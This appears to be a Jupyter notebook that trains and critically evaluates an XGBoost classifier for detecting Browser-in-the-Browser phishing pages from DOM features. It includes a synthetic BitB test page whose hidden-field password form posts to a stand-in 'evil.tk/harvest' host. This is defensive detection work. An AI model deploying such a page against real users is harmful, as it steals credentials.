# WebSentinel — Layer 1: BitB HTML Classifier Training

---

## What is a BitB Attack?

**Browser-in-the-Browser (BitB)** is a phishing technique that creates a **fake browser popup window** inside a webpage — complete with a spoofed address bar showing a legitimate URL like `https://login.microsoft.com`.

```
┌─────────────────────────────────────────┐
│  Real Browser Window                    │
│  URL: http://evil-phish.xyz/game        │
│ ┌───────────────────────────────────┐   │
│ │ 🔒 https://login.microsoft.com   │   │  ← FAKE popup (just a div + CSS)
│ ├───────────────────────────────────┤   │
│ │  [Microsoft Logo]                 │   │
│ │  Sign in                          │   │
│ │  Email: [___________________]     │   │
│ │  Password: [________________]     │   │
│ │  [Sign in]                        │   │  ← Credentials sent to attacker
│ └───────────────────────────────────┘   │
└─────────────────────────────────────────┘
```

The victim sees what looks like a legitimate OAuth popup but it is entirely within the attacker's page — no actual `microsoft.com` page is involved.

---

## Overview

**Layer 1 (L1)** detects BitB attacks by analyzing the **DOM (HTML source)** of every page the browser visits.

This notebook trains a **binary classifier** (phishing=1 / legitimate=0) using **16 DOM features** extracted from real phishing HTML snapshots.

### Dataset
**Mendeley Phishing Dataset** — `n96ncsr5g4-1.zip`  
Contains 8 part ZIPs, each holding thousands of `.html` snapshot files.  
We collect up to **15,000 samples per class** (30,000 total) for balanced training.

### Model
**XGBoost Classifier** with optional GTX 1050 GPU acceleration  
- Input: 16 DOM/style features  
- Output: probability 0.0 (legitimate) → 1.0 (phishing/BitB)  
- Saved to: `models/bitb_classifier.pkl`
---

## Status of this model in the shipped system

This notebook still documents how `models/bitb_classifier.pkl` is produced, but two
things about **how the trained model is used** have changed since it was written. Both
are covered in section 9.

| | |
|---|---|
| **Role** | A **bounded overlay** on the deterministic rules, not the layer score. Production computes `final = min(1.0, heuristic + 0.15 * ml_prob)`. It used to be `max(heuristic, ml_prob)`. |
| **Why** | The model is trained on a **generic phishing** corpus, not a BitB corpus. Section 9 measures the consequences: it misses real BitB kits and false-positives on a benign login page. |
| **Deployed values** | The shipped `.pkl` is not the 300/6/0.1 model this notebook fits by default — it comes from `scripts/tune_models.py` (RandomizedSearchCV): **489 trees, depth 7, learning rate 0.1053**. |

> **Hard dependency.** `extract_html_features()` parses with BeautifulSoup + lxml. If
> either is missing the extractor returns an **all-zero vector**, and the model then
> scores *every* page at the same 0.643 — silently, with no error. Both are pinned in
> `requirements.txt`; do not drop them.


---
## Step 0 — Install Dependencies

In [ ]:
import sys
!{sys.executable} -m pip install pandas numpy scikit-learn xgboost beautifulsoup4 lxml matplotlib seaborn --quiet
print('All dependencies installed.')

---
## Step 1 — Imports & Paths

In [ ]:
import re
import sys
import zipfile
import pickle
import io
from pathlib import Path
from urllib.parse import urlparse

import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import matplotlib.ticker as mtick
import seaborn as sns
from bs4 import BeautifulSoup

from sklearn.model_selection import train_test_split
from sklearn.metrics import (
    classification_report, confusion_matrix,
    f1_score, roc_auc_score, roc_curve
)

# ── Notebook styling ────────────────────────────────────────────────────────
sns.set_theme(style='whitegrid', palette='muted')
plt.rcParams['figure.dpi'] = 110

# ── Project paths ───────────────────────────────────────────────────────────
# Walk up until we find the repository root rather than assuming a fixed depth.
# This notebook lives at researches/c2/, so the old `Path().resolve().parent`
# resolved to researches/ and wrote the model to researches/models/ — where the
# backend never looks for it.
NOTEBOOK_DIR = Path().resolve()
PROJECT_ROOT = next(
    (p for p in [NOTEBOOK_DIR, *NOTEBOOK_DIR.parents] if (p / 'core' / 'c2').is_dir()),
    NOTEBOOK_DIR.parent,
)

OUTER_ZIP = PROJECT_ROOT / 'Dataset' / 'n96ncsr5g4-1.zip'
if not OUTER_ZIP.exists():
    OUTER_ZIP = PROJECT_ROOT.parent / 'Dataset' / 'n96ncsr5g4-1.zip'

MODEL_OUT = PROJECT_ROOT / 'models' / 'bitb_classifier.pkl'
CSV_OUT   = PROJECT_ROOT / 'data'   / 'html_features.csv'

# How many HTML files to collect per class
# 15,000 phishing + 15,000 legitimate = 30,000 total — balanced dataset
SAMPLE_PER_CLASS = 15_000

print(f'Project root : {PROJECT_ROOT}')
print(f'Dataset      : {OUTER_ZIP}')
print(f'Dataset found: {OUTER_ZIP.exists()}')
print(f'Model out    : {MODEL_OUT}')
assert (PROJECT_ROOT / 'core' / 'c2').is_dir(), (
    f'PROJECT_ROOT looks wrong: {PROJECT_ROOT}')

---
## Step 2 — Parse index.sql (File → Label Mapping)

The dataset's `index.sql` maps each HTML snapshot filename to its URL and label:
```sql
INSERT INTO `websites` VALUES (42, 'http://paypal-secure.tk/login', 'snap_042.html', 1, ...);
--                                  ^-- original URL                 ^-- HTML file   ^-- label
```

We build a `{filename: (url, label)}` lookup dict so that when we encounter an HTML file inside a part ZIP, we know what label to assign.

In [ ]:
def parse_index(sql_text: str) -> dict:
    """
    Parse index.sql and return a mapping: {html_filename: (url, label)}
    
    Only records with a .html filename are included.
    label: 1 = phishing, 0 = legitimate
    """
    # Regex captures: (id, 'url', 'filename.html', label)
    pattern = re.compile(
        r"\(\s*\d+\s*,\s*'([^']+)'\s*,\s*'([^']*\.html)'\s*,\s*([01])\s*,",
        re.DOTALL
    )
    index = {}
    for m in pattern.finditer(sql_text):
        url      = m.group(1)
        filename = m.group(2)
        label    = int(m.group(3))
        # Use just the base filename as key (strip any path prefix)
        index[filename.split('/')[-1]] = (url, label)
    return index


print(f'Opening {OUTER_ZIP.name} ...')
with zipfile.ZipFile(OUTER_ZIP) as outer:
    sql_bytes = outer.read('n96ncsr5g4-1/index.sql')

sql_text = sql_bytes.decode('utf-8', errors='replace')
index    = parse_index(sql_text)

phish_n = sum(1 for _, lbl in index.values() if lbl == 1)
legit_n = len(index) - phish_n

print(f'Total HTML records  : {len(index):,}')
print(f'  Phishing (1)      : {phish_n:,}')
print(f'  Legitimate (0)    : {legit_n:,}')

---
## Step 3 — DOM Feature Engineering

We extract **16 features** from each HTML snapshot using **BeautifulSoup** (parser) and **regex** (style/script patterns).  

These features target the structural patterns that make BitB attacks detectable:

| # | Feature | Type | What it detects |
|---|---------|------|----------------|
| 1 | `n_iframes` | numeric | Number of `<iframe>` elements — BitB uses iframes to embed content |
| 2 | `has_fixed_iframe` | binary | `position:fixed` on an iframe — pins it to screen like a real popup |
| 3 | `max_zindex` | numeric | Highest z-index found — BitB uses z-index:99999 to float above everything |
| 4 | `full_viewport` | binary | `width:100vw; height:100vh` — overlay covers the entire screen |
| 5 | `drag_prevent` | binary | `ondragstart`, `user-select:none` — prevents user from revealing the fake UI |
| 6 | `n_forms` | numeric | Number of `<form>` elements |
| 7 | `n_inputs` | numeric | Total input fields |
| 8 | `n_pw_inputs` | numeric | `<input type='password'>` — credential harvesting indicator |
| 9 | `n_hidden_inputs` | numeric | Hidden fields — used to pass stolen data silently |
| 10 | `n_ext_scripts` | numeric | Scripts loaded from external (HTTP) domains — tracking/exploit delivery |
| 11 | `form_ext_action` | binary | Form `action` points to a different domain than the page URL |
| 12 | `title_brand` | binary | `<title>` contains a known brand name (paypal, microsoft, etc.) |
| 13 | `favicon_brand` | binary | Favicon URL references a brand domain (impersonation signal) |
| 14 | `has_overlay` | binary | Contains `.overlay` or `.modal` CSS class — full-screen overlays |
| 15 | `has_redirect` | binary | `window.location` in scripts — redirect after credential capture |
| 16 | `html_size_kb` | numeric | Raw HTML size in KB — phishing pages often very large or very small |

In [ ]:
# Known brand names used for impersonation detection
BRANDS = {
    'paypal', 'microsoft', 'apple', 'amazon', 'google', 'facebook',
    'instagram', 'netflix', 'dropbox', 'linkedin', 'twitter',
    'wellsfargo', 'chase', 'hsbc', 'dhl', 'fedex', 'irs',
}

FEATURE_COLS = [
    'n_iframes', 'has_fixed_iframe', 'max_zindex', 'full_viewport',
    'drag_prevent', 'n_forms', 'n_inputs', 'n_pw_inputs',
    'n_hidden_inputs', 'n_ext_scripts', 'form_ext_action',
    'title_brand', 'favicon_brand', 'has_overlay',
    'has_redirect', 'html_size_kb',
]


def extract_html_features(html: str, url: str = '') -> dict:
    """
    Extract 16 DOM/style features from a raw HTML string.
    
    Args:
        html: Raw HTML content as a string
        url:  The URL of the page (used for form action domain comparison)
    
    Returns:
        dict with 16 features (all numeric)
    """
    lo = html.lower()   # lowercase version for case-insensitive pattern matching

    try:
        # lxml is faster than html.parser; fallback to empty features on parse error
        soup = BeautifulSoup(html, 'lxml')
    except Exception:
        return {col: 0 for col in FEATURE_COLS}

    # ── DOM element counts ───────────────────────────────────────────────────
    iframes = soup.find_all('iframe')
    forms   = soup.find_all('form')
    inputs  = soup.find_all('input')
    scripts = soup.find_all('script')

    # ── Title and favicon ────────────────────────────────────────────────────
    title = ''
    if soup.title and soup.title.string:
        title = soup.title.string.lower()

    favicon_url = ''
    for lnk in soup.find_all('link'):
        rel = lnk.get('rel', [])
        if isinstance(rel, list):
            rel = ' '.join(rel)
        if 'icon' in rel.lower():
            favicon_url = lnk.get('href', '').lower()
            break

    # ── Feature 3: Maximum z-index ───────────────────────────────────────────
    # BitB overlays use extremely high z-index (99999) to sit above everything
    # We cap at 9999 to avoid extreme outliers in the feature
    zindices  = [int(m) for m in re.findall(r'z-index\s*:\s*(\d+)', lo)]
    max_zindex = min(max(zindices) if zindices else 0, 9999)

    # ── Feature 2: Fixed-position iframe ────────────────────────────────────
    # position:fixed on an iframe makes it cover the whole screen like a popup
    has_fixed_iframe = int(
        bool(iframes) and bool(re.search(r'position\s*:\s*fixed', lo))
    )

    # ── Feature 4: Full viewport coverage ───────────────────────────────────
    # width:100vw + height:100vh means the element fills the entire browser window
    full_viewport = int(
        bool(re.search(r'width\s*:\s*100(vw|%)', lo))
        and bool(re.search(r'height\s*:\s*100(vh|%)', lo))
    )

    # ── Feature 5: Drag/selection prevention ────────────────────────────────
    # Prevents user from dragging the fake window to reveal it's just a div
    drag_prevent = int(
        bool(re.search(r'(ondragstart|onselectstart|user-select\s*:\s*none)', lo))
    )

    # ── Features 8 & 9: Input type counts ───────────────────────────────────
    n_pw_inputs     = sum(1 for i in inputs if i.get('type', '').lower() == 'password')
    n_hidden_inputs = sum(1 for i in inputs if i.get('type', '').lower() == 'hidden')

    # ── Feature 10: External scripts ─────────────────────────────────────────
    # Scripts loaded from HTTP domains (not same-origin) are often tracking or exploits
    n_ext_scripts = sum(
        1 for s in scripts if s.get('src', '').startswith('http')
    )

    # ── Feature 11: Form action points to different domain ───────────────────
    # The form submits credentials to the attacker's domain, not the displayed domain
    form_ext_action = 0
    page_host = urlparse(url).hostname or '' if url else ''
    for f in forms:
        action = f.get('action', '')
        if action.startswith('http') and page_host:
            form_host = urlparse(action).hostname or ''
            if form_host and form_host != page_host:
                form_ext_action = 1
                break

    # ── Features 12 & 13: Brand name in title / favicon ──────────────────────
    title_brand   = int(any(b in title       for b in BRANDS))
    favicon_brand = int(any(b in favicon_url for b in BRANDS))

    # ── Feature 14: Overlay/modal class ──────────────────────────────────────
    has_overlay = int(bool(re.search(r'\b(overlay|modal)\b', lo)))

    # ── Feature 15: JavaScript redirect ──────────────────────────────────────
    # window.location reassignment is used to redirect after stealing credentials
    has_redirect = int(bool(re.search(r'window\.location', lo)))

    return {
        'n_iframes':        len(iframes),
        'has_fixed_iframe': has_fixed_iframe,
        'max_zindex':       max_zindex,
        'full_viewport':    full_viewport,
        'drag_prevent':     drag_prevent,
        'n_forms':          len(forms),
        'n_inputs':         len(inputs),
        'n_pw_inputs':      n_pw_inputs,
        'n_hidden_inputs':  n_hidden_inputs,
        'n_ext_scripts':    n_ext_scripts,
        'form_ext_action':  form_ext_action,
        'title_brand':      title_brand,
        'favicon_brand':    favicon_brand,
        'has_overlay':      has_overlay,
        'has_redirect':     has_redirect,
        'html_size_kb':     len(html) // 1024,
    }


# Quick feature extraction test on a sample BitB HTML
sample_bitb = '''
<html><head><title>PayPal - Secure Account Login</title>
<link rel="icon" href="https://paypal.com/favicon.ico"/></head>
<body ondragstart="return false" style="user-select:none">
  <div style="position:fixed;width:100vw;height:100vh;z-index:99999" class="overlay">
    <iframe style="position:fixed;width:100%;height:100%" src="http://evil.tk/steal"></iframe>
    <form action="http://evil.tk/harvest" method="POST">
      <input type="hidden" name="sid" value="abc"/>
      <input type="email"/><input type="password"/>
    </form>
  </div>
  <script src="http://evil.tk/tracker.js"></script>
  <script>window.location = window.location;</script>
</body></html>
'''

test_feats = extract_html_features(sample_bitb, 'http://evil.tk/fake-paypal')
print('Sample BitB page features:')
for k, v in test_feats.items():
    flag = ' ← PHISHING SIGNAL' if v > 0 else ''
    print(f'  {k:20s} = {v}{flag}')

---
## Step 4 — Stream HTML Files from ZIP and Build Dataset

The dataset is organized as:
```
n96ncsr5g4-1.zip
└── n96ncsr5g4-1/
    ├── index.sql
    └── dataset/
        ├── dataset_part_1.zip    (contains ~10k .html files)
        ├── dataset_part_2.zip
        └── ...  (8 parts total)
```

We **stream** the part ZIPs one at a time to avoid loading everything into memory.  
We stop collecting once we reach `SAMPLE_PER_CLASS` samples per label.

In [ ]:
def process_all_parts(outer_zip: zipfile.ZipFile, index: dict) -> pd.DataFrame:
    """
    Stream through all dataset_part_N.zip files inside the outer zip.
    For each HTML file found, look up its label from index, extract features,
    and collect up to SAMPLE_PER_CLASS samples per class.
    
    Returns a DataFrame with FEATURE_COLS + 'label' columns.
    """
    rows      = []
    collected = {0: 0, 1: 0}                          # count per label
    needed    = {0: SAMPLE_PER_CLASS, 1: SAMPLE_PER_CLASS}

    # Find all part zip files (sorted to process in order)
    part_names = sorted(
        n for n in outer_zip.namelist()
        if re.search(r'dataset_part_\d+\.zip$', n)
    )
    print(f'Found {len(part_names)} part ZIPs in dataset')

    for part_name in part_names:
        # Stop early if we have enough samples from both classes
        if all(collected[k] >= needed[k] for k in (0, 1)):
            print('Reached target sample count — stopping early.')
            break

        print(f'\n  Processing: {part_name.split("/")[-1]} ...', flush=True)
        try:
            # Read part zip bytes and open as an in-memory ZipFile
            part_bytes = outer_zip.read(part_name)
            part_zip   = zipfile.ZipFile(io.BytesIO(part_bytes))
        except Exception as e:
            print(f'  Skipped ({e})')
            continue

        html_names = [n for n in part_zip.namelist() if n.endswith('.html')]
        part_added = 0

        for entry in html_names:
            fn = entry.split('/')[-1]   # strip path, keep base filename

            # Look up this file in the index
            if fn not in index:
                continue
            url, label = index[fn]

            # Skip if we already have enough of this class
            if collected[label] >= needed[label]:
                continue

            try:
                html  = part_zip.read(entry).decode('utf-8', errors='replace')
                feats = extract_html_features(html, url)
                feats['label'] = label
                rows.append(feats)
                collected[label] += 1
                part_added += 1

                # Print progress every 500 samples
                total = collected[0] + collected[1]
                if total % 500 == 0:
                    pct = total / (needed[0] + needed[1]) * 100
                    print(f'    [{pct:5.1f}%] {total:,}/{needed[0]+needed[1]:,}  '
                          f'(phish={collected[1]:,} legit={collected[0]:,})', flush=True)
            except Exception:
                continue

        print(f'  Part done — added {part_added} samples  '
              f'| Running total: phish={collected[1]:,} legit={collected[0]:,}', flush=True)

    return pd.DataFrame(rows)


print('Opening dataset and streaming HTML files ...')
print(f'Target: {SAMPLE_PER_CLASS:,} phishing + {SAMPLE_PER_CLASS:,} legitimate samples\n')

with zipfile.ZipFile(OUTER_ZIP) as outer_zip:
    df = process_all_parts(outer_zip, index)

print(f'\nFinal dataset shape  : {df.shape}')
print(f'Phishing samples (1) : {(df.label == 1).sum():,}')
print(f'Legitimate samples(0): {(df.label == 0).sum():,}')

# Save for later inspection
CSV_OUT.parent.mkdir(parents=True, exist_ok=True)
df.to_csv(CSV_OUT, index=False)
print(f'\nFeature CSV saved → {CSV_OUT}')

df.head()

---
## Step 5 — Exploratory Data Analysis (EDA)

In [ ]:
# ── 5a. Class Balance ────────────────────────────────────────────────────────
fig, axes = plt.subplots(1, 2, figsize=(12, 4))

counts = df['label'].value_counts().sort_index()
axes[0].bar(['Legitimate (0)', 'Phishing (1)'], counts.values,
            color=['#27ae60', '#c0392b'], edgecolor='white', linewidth=1.5)
axes[0].set_title('Class Distribution', fontsize=13, fontweight='bold')
axes[0].set_ylabel('Number of HTML pages')
for i, v in enumerate(counts.values):
    axes[0].text(i, v + 80, f'{v:,}', ha='center', fontsize=11)

axes[1].pie(counts.values, labels=['Legitimate', 'Phishing'],
            colors=['#27ae60', '#c0392b'], autopct='%1.1f%%',
            startangle=90, textprops={'fontsize': 12})
axes[1].set_title('Class Proportion', fontsize=13, fontweight='bold')

plt.suptitle('Dataset Class Balance (HTML Snapshots)', fontsize=14, y=1.02)
plt.tight_layout()
plt.show()

In [ ]:
# ── 5b. Binary feature hit-rates ────────────────────────────────────────────
# These show which features are most discriminative between the two classes

binary_feats = ['has_fixed_iframe', 'full_viewport', 'drag_prevent',
                'form_ext_action', 'title_brand', 'favicon_brand',
                'has_overlay', 'has_redirect']

phish_df = df[df.label == 1]
legit_df = df[df.label == 0]

p_rates = phish_df[binary_feats].mean() * 100
l_rates = legit_df[binary_feats].mean() * 100

x     = np.arange(len(binary_feats))
width = 0.35

fig, ax = plt.subplots(figsize=(14, 5))
bars_l = ax.bar(x - width/2, l_rates, width, label='Legitimate', color='#27ae60', alpha=0.85)
bars_p = ax.bar(x + width/2, p_rates, width, label='Phishing',   color='#c0392b', alpha=0.85)

ax.set_xticks(x)
ax.set_xticklabels(binary_feats, rotation=25, ha='right', fontsize=10)
ax.set_ylabel('Hit Rate (%)')
ax.set_title('BitB DOM Feature Hit Rates: Phishing vs Legitimate', fontsize=13, fontweight='bold')
ax.yaxis.set_major_formatter(mtick.PercentFormatter())
ax.legend(fontsize=11)
ax.set_ylim(0, 105)

for bar in list(bars_l) + list(bars_p):
    ax.text(bar.get_x() + bar.get_width()/2, bar.get_height() + 1,
            f'{bar.get_height():.1f}%', ha='center', fontsize=8)

plt.tight_layout()
plt.show()

In [ ]:
# ── 5c. Numeric feature distributions ───────────────────────────────────────

numeric_feats = ['n_iframes', 'max_zindex', 'n_forms',
                 'n_inputs', 'n_pw_inputs', 'n_ext_scripts', 'html_size_kb']

fig, axes = plt.subplots(2, 4, figsize=(16, 8))
axes = axes.flatten()

for i, feat in enumerate(numeric_feats):
    cap = df[feat].quantile(0.98)
    legit_vals = df[df.label == 0][feat].clip(upper=cap)
    phish_vals = df[df.label == 1][feat].clip(upper=cap)
    axes[i].hist(legit_vals, bins=30, alpha=0.6, color='#27ae60', label='Legit',   density=True)
    axes[i].hist(phish_vals, bins=30, alpha=0.6, color='#c0392b', label='Phishing',density=True)
    axes[i].set_title(feat, fontsize=11, fontweight='bold')
    axes[i].legend(fontsize=8)

# Hide the unused subplot
axes[-1].set_visible(False)

plt.suptitle('Numeric Feature Distributions: Phishing vs Legitimate', fontsize=13, y=1.01)
plt.tight_layout()
plt.show()

In [ ]:
# ── 5d. Correlation heatmap ──────────────────────────────────────────────────
fig, ax = plt.subplots(figsize=(14, 11))
corr = df[FEATURE_COLS + ['label']].corr()
mask = np.triu(np.ones_like(corr, dtype=bool))
sns.heatmap(corr, mask=mask, annot=True, fmt='.2f', cmap='RdYlGn',
            center=0, linewidths=0.5, ax=ax, annot_kws={'size': 8})
ax.set_title('Feature Correlation Matrix (last row = correlation with label)',
             fontsize=12, fontweight='bold')
plt.tight_layout()
plt.show()

---
## Step 6 — Train / Test Split

In [ ]:
X = df[FEATURE_COLS]  # 16 DOM features
y = df['label']       # 0 = legitimate, 1 = phishing

X_train, X_test, y_train, y_test = train_test_split(
    X, y,
    test_size   = 0.2,   # 20% for evaluation
    random_state= 42,
    stratify    = y      # keep class ratio balanced in both sets
)

print(f'Training set : {len(X_train):,}  (phish={y_train.sum():,} / legit={(y_train==0).sum():,})')
print(f'Test set     : {len(X_test):,}   (phish={y_test.sum():,}  / legit={(y_test==0).sum():,})')

---
## Step 7 — Train XGBoost (with GPU support)

Training order:
1. Try **XGBoost with CUDA** (GTX 1050 / any NVIDIA GPU) — fastest
2. Fall back to **XGBoost CPU** if no GPU available
3. Fall back to **RandomForest** if XGBoost not installed

In [ ]:
# NOTE — these are the notebook's baseline hyper-parameters (300 / 6 / 0.1).
# The model actually shipped in models/bitb_classifier.pkl was produced by
# scripts/tune_models.py, which runs RandomizedSearchCV over a wider space and
# settled on 489 trees, max_depth 7, learning_rate 0.1053. Retraining here and
# saving in section 10 will therefore REPLACE the tuned model with this baseline.
# Run scripts/tune_models.py afterwards if you want the tuned values back.

model_name = None
model      = None

try:
    from xgboost import XGBClassifier

    # ── Attempt 1: GPU (CUDA) ────────────────────────────────────────────────
    try:
        model_gpu = XGBClassifier(
            n_estimators    = 300,
            max_depth       = 6,
            learning_rate   = 0.1,
            subsample       = 0.8,
            colsample_bytree= 0.8,
            eval_metric     = 'logloss',
            random_state    = 42,
            device          = 'cuda',   # XGBoost >= 2.0 API
        )
        # Probe fit — fails fast if CUDA is not available
        _Xp = np.zeros((2, len(FEATURE_COLS)))
        _yp = np.array([0, 1])
        model_gpu.fit(_Xp, _yp)

        model      = model_gpu
        model_name = 'XGBoost (GPU/CUDA)'
        print('GPU detected — will train on CUDA device.')

    except Exception as gpu_err:
        # ── Attempt 2: CPU ───────────────────────────────────────────────────
        print(f'GPU not available ({gpu_err})')
        print('Falling back to XGBoost CPU ...')
        model = XGBClassifier(
            n_estimators    = 300,
            max_depth       = 6,
            learning_rate   = 0.1,
            subsample       = 0.8,
            colsample_bytree= 0.8,
            eval_metric     = 'logloss',
            random_state    = 42,
        )
        model_name = 'XGBoost (CPU)'

except ImportError:
    # ── Attempt 3: RandomForest fallback ────────────────────────────────────
    from sklearn.ensemble import RandomForestClassifier
    print('XGBoost not installed — using RandomForest fallback.')
    model = RandomForestClassifier(
        n_estimators = 300,
        max_depth    = 10,
        random_state = 42,
        n_jobs       = -1
    )
    model_name = 'RandomForest'

print(f'\nFitting {model_name} on {len(X_train):,} samples ...')
model.fit(X_train, y_train)
print('Training complete!')

---
## Step 8 — Model Evaluation

In [ ]:
# ── 8a. Classification Report ────────────────────────────────────────────────
y_pred = model.predict(X_test)
y_prob = model.predict_proba(X_test)[:, 1]   # phishing probability

f1  = f1_score(y_test, y_pred)
auc = roc_auc_score(y_test, y_prob)

print('=' * 55)
print(f'  {model_name} — Test Set Performance')
print('=' * 55)
print(f'  F1 Score  : {f1:.4f}')
print(f'  ROC-AUC   : {auc:.4f}')
print('=' * 55)
print()
print(classification_report(y_test, y_pred, target_names=['Legitimate', 'Phishing']))

In [ ]:
# ── 8b. Confusion Matrix + ROC Curve ────────────────────────────────────────
fig, axes = plt.subplots(1, 2, figsize=(13, 5))

# Confusion Matrix
cm = confusion_matrix(y_test, y_pred)
sns.heatmap(cm, annot=True, fmt='d', cmap='Reds',
            xticklabels=['Legit', 'Phishing'],
            yticklabels=['Legit', 'Phishing'],
            ax=axes[0], annot_kws={'size': 14})
axes[0].set_title('Confusion Matrix', fontsize=13, fontweight='bold')
axes[0].set_xlabel('Predicted')
axes[0].set_ylabel('Actual')
axes[0].text(0.5, -0.15,
    f'TN={cm[0,0]:,}  FP={cm[0,1]:,}  FN={cm[1,0]:,}  TP={cm[1,1]:,}',
    ha='center', transform=axes[0].transAxes, fontsize=10, color='gray')

# ROC Curve
fpr, tpr, _ = roc_curve(y_test, y_prob)
axes[1].plot(fpr, tpr, color='#c0392b', lw=2.5, label=f'ROC (AUC = {auc:.4f})')
axes[1].plot([0, 1], [0, 1], 'k--', lw=1, label='Random classifier')
axes[1].fill_between(fpr, tpr, alpha=0.08, color='#c0392b')
axes[1].set_xlabel('False Positive Rate')
axes[1].set_ylabel('True Positive Rate')
axes[1].set_title('ROC Curve', fontsize=13, fontweight='bold')
axes[1].legend(fontsize=11)

plt.tight_layout()
plt.show()

In [ ]:
# ── 8c. Feature Importance ───────────────────────────────────────────────────
importances = model.feature_importances_
feat_imp_df = pd.DataFrame({'feature': FEATURE_COLS, 'importance': importances})
feat_imp_df = feat_imp_df.sort_values('importance', ascending=True)

fig, ax = plt.subplots(figsize=(10, 8))
threshold = feat_imp_df.importance.median()
colors = ['#c0392b' if v > threshold else '#2980b9' for v in feat_imp_df.importance]
bars = ax.barh(feat_imp_df.feature, feat_imp_df.importance, color=colors, edgecolor='white')

for bar, val in zip(bars, feat_imp_df.importance):
    ax.text(val + 0.001, bar.get_y() + bar.get_height()/2,
            f'{val:.4f}', va='center', fontsize=9)

ax.set_xlabel('Feature Importance (gain)')
ax.set_title('BitB HTML Feature Importance\n(red = above median)', fontsize=13, fontweight='bold')
ax.set_xlim(0, feat_imp_df.importance.max() * 1.2)
plt.tight_layout()
plt.show()

print('Top 5 most important features for BitB detection:')
print(feat_imp_df.sort_values('importance', ascending=False).head(5).to_string(index=False))

In [ ]:
# ── 8d. Score Distribution ───────────────────────────────────────────────────
# Shows how well the model separates phishing from legitimate pages
# Ideally: phishing scores cluster near 1.0, legitimate near 0.0

fig, ax = plt.subplots(figsize=(10, 5))

prob_legit  = y_prob[y_test == 0]
prob_phish  = y_prob[y_test == 1]

ax.hist(prob_legit, bins=50, alpha=0.6, color='#27ae60', label='Legitimate', density=True)
ax.hist(prob_phish, bins=50, alpha=0.6, color='#c0392b', label='Phishing',   density=True)
ax.axvline(0.5, color='black', linestyle='--', linewidth=1.5, label='Decision boundary (0.5)')
ax.set_xlabel('Predicted Phishing Probability')
ax.set_ylabel('Density')
ax.set_title('Model Score Distribution\n(ideal: two well-separated peaks)', fontsize=13, fontweight='bold')
ax.legend(fontsize=11)
plt.tight_layout()
plt.show()

print(f'Phishing   — mean score: {prob_phish.mean():.4f}  std: {prob_phish.std():.4f}')
print(f'Legitimate — mean score: {prob_legit.mean():.4f}  std: {prob_legit.std():.4f}')

---
## Step 9 — Reality Check: Does This Model Detect BitB?

Section 8 measures the model against a held-out slice of **its own corpus**. That is a
necessary check, not a sufficient one: it answers *"did it learn this dataset?"*, not
*"did it learn Browser-in-the-Browser?"*

Those turn out to be different questions. The cells below score the trained model against
the project's real BitB fixtures and then look at what the training data actually taught
it. Run them after section 8.

In [ ]:
# ── 9a. Score the trained model on real, labelled pages ─────────────────────
# Fixtures live in test/C2/. bitb_samples/ are saved copies of real kits, so their
# CSS is linked rather than inline — inline it first, exactly as the runtime test
# harness (test_bitb_samples.py) does, or the DOM the model sees is not the DOM a
# browser would render.
import re as _re

TEST_DIR = PROJECT_ROOT / 'test' / 'C2'


def _inline_css(html: str, folder: Path) -> str:
    def rep(m):
        p = folder / m.group(1)
        if p.exists():
            return '<style>\n' + p.read_text(encoding='utf-8', errors='replace') + '\n</style>'
        return m.group(0)
    return _re.sub(r'<link[^>]+href=["\']([^"\']+\.css)["\'][^>]*>', rep, html, flags=_re.I)


# (path, human label, is_bitb)
targets = []
for name, is_bitb in [('benign_login.html', False), ('benign_oauth.html', False),
                      ('bitb_kit_macos.html', True), ('bitb_kit_windows.html', True)]:
    p = TEST_DIR / 'pages' / name
    if p.exists():
        targets.append((p, name, is_bitb))
for p in sorted((TEST_DIR / 'bitb_samples').glob('*/index.html')):
    targets.append((p, p.parent.name, True))

rows = []
for path, label, is_bitb in targets:
    html = path.read_text(encoding='utf-8', errors='replace')
    if path.name == 'index.html':
        html = _inline_css(html, path.parent)
    feats = extract_html_features(html, 'https://example.test/')
    prob = float(model.predict_proba(pd.DataFrame([feats])[FEATURE_COLS])[0][1])
    rows.append({'page': label,
                 'truth': 'BitB' if is_bitb else 'benign',
                 'ml_prob': round(prob, 4),
                 'model_says': 'BitB' if prob >= 0.5 else 'benign',
                 'correct': (prob >= 0.5) == is_bitb})

real = pd.DataFrame(rows)
print(real.to_string(index=False))
print()
n_ok = int(real.correct.sum())
print(f'Correct on real pages: {n_ok}/{len(real)}')
print('Compare with the held-out F1 reported in section 8.')

In [ ]:
# ── 9b. What did the training data actually teach? ──────────────────────────
# has_fixed_iframe is THE mechanism of a BitB attack: the fake window is a
# position:fixed iframe painted over the page. Check how it is distributed
# across the two training classes.
means = df.groupby('label')[FEATURE_COLS].mean().T
means.columns = ['benign (0)', 'phishing (1)']
means['ratio'] = (means['phishing (1)'] + 1e-9) / (means['benign (0)'] + 1e-9)

core_bitb = ['has_fixed_iframe', 'n_iframes', 'max_zindex',
             'full_viewport', 'drag_prevent', 'has_overlay']
print('Core BitB signals, mean value per class:')
print(means.loc[core_bitb].round(3).to_string())
print()
inverted = means.loc[core_bitb].query('ratio < 1').index.tolist()
print(f'Signals MORE common in the benign class: {inverted}')
print()

imp = (pd.Series(model.feature_importances_, index=FEATURE_COLS)
         .sort_values(ascending=False))
print('Rank of each core BitB signal in the model:')
for f in core_bitb:
    print(f'  {f:20s} rank {list(imp.index).index(f) + 1:2d}/16   importance {imp[f]:.4f}')
print()
print(f'Most influential feature overall: {imp.index[0]} ({imp.iloc[0]:.4f})')

In [ ]:
# ── 9c. Visualise the inversion ─────────────────────────────────────────────
fig, axes = plt.subplots(1, 2, figsize=(13, 4.5))

sub = means.loc[core_bitb, ['benign (0)', 'phishing (1)']]
sub.plot.barh(ax=axes[0], color=['#2980b9', '#c0392b'], edgecolor='white')
axes[0].set_title('Core BitB signals by training class\n'
                  'bars where blue > red are inverted', fontweight='bold', fontsize=11)
axes[0].set_xlabel('mean value')
axes[0].legend(title=None)

order = imp.sort_values()
cols = ['#c0392b' if f in core_bitb else '#95a5a6' for f in order.index]
axes[1].barh(order.index, order.values, color=cols, edgecolor='white')
axes[1].set_title('Model feature importance\n(red = a core BitB signal)',
                  fontweight='bold', fontsize=11)
axes[1].set_xlabel('importance (gain)')

plt.tight_layout()
plt.show()

### What section 9 shows, and what production does about it

Measured on the current corpus and the shipped model:

| Observation | Value |
|---|---|
| Held-out F1 / ROC-AUC (section 8) | **0.905 / 0.964** |
| `has_fixed_iframe` mean, benign class | **0.099** |
| `has_fixed_iframe` mean, phishing class | **0.047** |
| `has_fixed_iframe` importance rank | **16th of 16** |
